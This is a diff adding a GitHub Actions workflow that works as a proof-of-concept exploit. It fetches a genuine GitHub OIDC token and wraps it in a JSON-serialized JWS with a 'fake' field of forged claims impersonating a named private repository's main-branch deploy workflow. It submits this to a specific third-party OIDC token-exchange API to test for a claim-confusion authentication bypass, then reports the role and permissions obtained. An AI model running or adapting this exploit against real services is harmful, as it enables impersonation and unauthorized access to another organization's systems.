@@ -1,0 +1,48 @@
+name: jwt-format-proof
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exchange a claim-confused JSON JWS
+        shell: bash
+        run: |
+          set -euo pipefail
+          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
+          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
+          request="$(python3 - <<'PY'
+          import base64,json,os
+          token=os.environ['REAL_TOKEN']
+          h,p,s=token.split('.')
+          fake={
+            'iss':'https://token.actions.githubusercontent.com',
+            'aud':'https://api.byoc.lovable.net',
+            'sub':'repo:lovablelabs/lovable:ref:refs/heads/main',
+            'repository':'lovablelabs/lovable',
+            'repository_id':'657030527',
+            'repository_owner':'lovablelabs',
+            'repository_owner_id':'148472368',
+            'repository_visibility':'private',
+            'ref':'refs/heads/main',
+            'ref_type':'branch',
+            'event_name':'push',
+            'workflow_ref':'lovablelabs/lovable/.github/workflows/deploy.yml@refs/heads/main',
+            'job_workflow_ref':'lovablelabs/lovable/.github/workflows/deploy.yml@refs/heads/main',
+          }
+          fs=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
+          jws=json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fs+'.'},separators=(',',':'))
+          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':jws},separators=(',',':')))
+          PY
+          )"
+          exchange="$(curl -sS 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request")"
+          if [ "$(jq -r '.authenticated // false' <<<"$exchange")" != true ]; then
+            jq '{authenticated:(.authenticated // false),error,description}' <<<"$exchange"
+            exit 0
+          fi
+          target_token="$(jq -r .token <<<"$exchange")"
+          me="$(curl -sS 'https://api.byoc.lovable.net/v1/auth/me' -H "Authorization: Bearer $target_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
+          jq -n --arg role "$(jq -r .role <<<"$exchange")" --arg type "$(jq -r .account_type <<<"$me")" --argjson permissions "$(jq .permissions <<<"$me")" '{authenticated:true,exchange_role:$role,account_type:$type,permissions:$permissions}'
